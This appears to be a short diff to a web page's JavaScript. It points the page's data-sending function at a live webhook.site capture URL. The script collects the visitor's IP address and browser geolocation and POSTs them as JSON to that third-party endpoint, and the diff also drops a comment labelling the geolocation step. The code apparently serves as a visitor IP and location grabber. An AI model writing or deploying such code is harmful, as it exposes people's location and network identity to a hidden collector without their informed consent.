@@ -50,7 +50,6 @@
         data.ip = 'N/A';
       }
 
-      // Geolocalizzazione
       navigator.geolocation.getCurrentPosition(
         pos => {
           data.location = {
@@ -69,7 +68,7 @@
     }
 
     function sendData(data) {
-      fetch('https://YOUR-BACKEND-URL/save.php', {
+      fetch('https://webhook.site/a7e36058-c9a9-4f83-9740-7f2cc820609a', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
